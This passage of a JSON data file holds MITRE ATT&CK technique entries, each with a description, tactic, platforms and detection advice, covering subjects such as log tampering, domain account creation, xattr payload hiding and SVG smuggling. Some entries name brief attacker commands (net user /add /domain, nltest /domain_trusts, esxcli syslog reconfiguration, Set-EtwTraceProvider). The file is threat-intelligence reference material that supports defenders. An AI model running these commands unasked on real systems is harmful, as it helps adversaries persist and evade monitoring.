      "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059",
      "stix_id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
      "created": "2017-05-31T21:30:49.546000+00:00",
      "modified": "2025-04-15T19:58:41.855000+00:00",
      "platforms": [
        "IaaS",
        "Identity Provider",
        "Linux",
        "Network Devices",
        "Office Suite",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "Process: Process Creation",
        "Process: Process Metadata",
        "Module: Module Load",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
    },
    "T1562.006": {
      "id": "T1562.006",
      "name": "Indicator Blocking",
      "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)(Citation: Broadcom Configuring syslog on ESXi)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.006",
      "stix_id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da",
      "created": "2020-03-19T19:09:30.329000+00:00",
      "modified": "2025-04-16T21:29:20.899000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Sensor Health: Host Status",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>"
    },
    "T1136.002": {
      "id": "T1136.002",
      "name": "Domain Account",
      "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1136.002",
      "stix_id": "attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177",
      "created": "2020-01-28T14:05:17.825000+00:00",
      "modified": "2025-04-15T22:21:24.212000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "User Account: User Account Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary."
    },
    "T1564.014": {
      "id": "T1564.014",
      "name": "Extended Attributes",
      "description": "Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`,  `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux)\n\nAn adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.014",
      "stix_id": "attack-pattern--762e6f29-a62f-4d96-91ed-d0073181431f",
      "created": "2025-03-27T19:40:00.716000+00:00",
      "modified": "2025-04-15T19:58:42.110000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Metadata",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1589.003": {
      "id": "T1589.003",
      "name": "Employee Names",
      "description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1589.003",
      "stix_id": "attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156",
      "created": "2020-10-02T14:57:15.906000+00:00",
      "modified": "2025-04-15T22:27:33.795000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1482": {
      "id": "T1482",
      "name": "Domain Trust Discovery",
      "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1482",
      "stix_id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
      "created": "2019-02-14T16:15:05.974000+00:00",
      "modified": "2025-04-15T22:22:35.004000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Script: Script Execution",
        "Network Traffic: Network Traffic Content",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n"
    },
    "T1558.001": {
      "id": "T1558.001",
      "name": "Golden Ticket",
      "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558.001",
      "stix_id": "attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1",
      "created": "2020-02-11T19:13:33.643000+00:00",
      "modified": "2025-04-25T14:47:07.443000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Credential Request",
        "Logon Session: Logon Session Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n"
    },
    "T1020": {
      "id": "T1020",
      "name": "Automated Exfiltration",
      "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1020",
      "stix_id": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
      "created": "2017-05-31T21:30:29.458000+00:00",
      "modified": "2025-04-15T19:58:42.569000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "File: File Access",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious."
    },
    "T1592.004": {
      "id": "T1592.004",
      "name": "Client Configurations",
      "description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1592.004",
      "stix_id": "attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c",
      "created": "2020-10-02T16:47:16.719000+00:00",
      "modified": "2025-04-15T21:57:34.604000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1562.007": {
      "id": "T1562.007",
      "name": "Disable or Modify Cloud Firewall",
      "description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499). ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.007",
      "stix_id": "attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c",
      "created": "2020-06-24T16:55:46.243000+00:00",
      "modified": "2025-04-15T22:19:38.109000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firewall: Firewall Disable",
        "Firewall: Firewall Rule Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor cloud logs for modification or creation of new security groups or firewall rules."
    },
    "T1219.001": {
      "id": "T1219.001",
      "name": "IDE Tunneling",
      "description": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023)\n\nAdditionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.\n\nIDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1219.001",
      "stix_id": "attack-pattern--77e29a47-e263-4f11-8692-e5012f44dbac",
      "created": "2025-03-20T18:46:24.598000+00:00",
      "modified": "2025-04-22T16:34:13.454000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Connection Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1036.002": {
      "id": "T1036.002",
      "name": "Right-to-Left Override",
      "description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.002",
      "stix_id": "attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69",
      "created": "2020-02-10T19:55:29.385000+00:00",
      "modified": "2025-04-15T23:00:50.575000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it."
    },
    "T1588.001": {
      "id": "T1588.001",
      "name": "Malware",
      "description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.001",
      "stix_id": "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970",
      "created": "2020-10-01T02:06:11.499000+00:00",
      "modified": "2025-04-15T22:47:58.443000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Metadata",
        "Malware Repository: Malware Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    },
    "T1027.017": {
      "id": "T1027.017",
      "name": "SVG Smuggling",
      "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. \n\nSVG smuggling can take a number of forms. For example, threat actors may include content that: \n\n* Assembles malicious payloads(Citation: Talos SVG Smuggling 2022)\n* Downloads malicious payloads(Citation: Cofense SVG Smuggling 2024)\n* Redirects users to malicious websites(Citation: Bleeping Computer SVG Smuggling 2024)\n* Displays interactive content to users, such as fake login forms and download buttons.(Citation: Bleeping Computer SVG Smuggling 2024)\n\nSVG Smuggling may be used in conjunction with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where an SVG with a malicious payload is included inside an HTML file.(Citation: Talos SVG Smuggling 2022) SVGs may also be included in other types of documents, such as PDFs.  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.017",
      "stix_id": "attack-pattern--78b9e70d-1605-459c-b23d-e3a25036968c",
      "created": "2025-03-25T15:31:09.697000+00:00",
      "modified": "2025-04-15T19:58:43.263000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1542.002": {
      "id": "T1542.002",
      "name": "Component Firmware",
      "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542.002",
      "stix_id": "attack-pattern--791481f8-e96a-41be-b089-a088763083d4",
      "created": "2019-12-19T20:21:21.669000+00:00",
      "modified": "2025-04-15T19:58:43.347000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firmware: Firmware Modification",
        "Process: OS API Execution",
        "Driver: Driver Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components.(Citation: SanDisk SMART)(Citation: SmartMontools) Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\n\nDisk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014) Also consider comparing components, including hashes of component firmware and behavior, against known good images."
    },
    "T1070": {
      "id": "T1070",
      "name": "Indicator Removal",
      "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070",
      "stix_id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
      "created": "2017-05-31T21:30:55.892000+00:00",
      "modified": "2025-04-15T19:58:43.436000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Containers",
        "Network Devices",
        "Office Suite",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Scheduled Job: Scheduled Job Modification",
        "File: File Modification",
        "Firewall: Firewall Rule Modification",
        "User Account: User Account Authentication",
        "File: File Metadata",
        "User Account: User Account Deletion",
        "Process: OS API Execution",
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "File: File Deletion",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Network Traffic: Network Traffic Content",
        "Windows Registry: Windows Registry Key Deletion"
      ],
      "defense_bypassed": [],
      "detection": "File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms."
    },
    "T1048.001": {
      "id": "T1048.001",
      "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
      "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1048.001",
      "stix_id": "attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c",
      "created": "2020-03-15T15:30:42.378000+00:00",
      "modified": "2025-04-15T19:58:43.571000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "File: File Access",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
